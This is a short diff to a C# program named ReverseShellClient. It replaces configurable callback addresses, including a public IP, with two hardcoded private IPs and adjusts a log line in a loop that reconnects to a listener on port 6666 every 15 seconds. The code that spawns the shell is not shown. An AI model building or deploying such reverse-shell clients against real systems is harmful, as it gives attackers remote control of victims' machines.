@@ -21,16 +21,17 @@ namespace ReverseShellClient
         {
             int port = args.Length > 0 ? int.Parse(args[0]) : 6666;
 
-            string[] ips = { args.Length > 1 ? args[1] : "192.168.1.222", args.Length > 2 ? args[2] : "93.103.116.226" }; // toggle between local & public ip
+            string[] ips = {
+                "192.168.2.116",
+                "192.168.1.111"
+            };
             int ipIndex = 0;
-
-            Console.WriteLine($"Connect to: {ips[0]} or {ips[1]} on {port}");
 
             while (true)
             {
                 string tryIp = ips[ipIndex];
                 ipIndex = (ipIndex + 1) % ips.Length;
-                Console.WriteLine($"Trying to connect ({tryIp})");
+                Console.WriteLine($"Trying to connect to {tryIp} on port {port}");
 
                 ConnectToServer(tryIp, port);
                 System.Threading.Thread.Sleep(15000); //Wait 15 seconds 
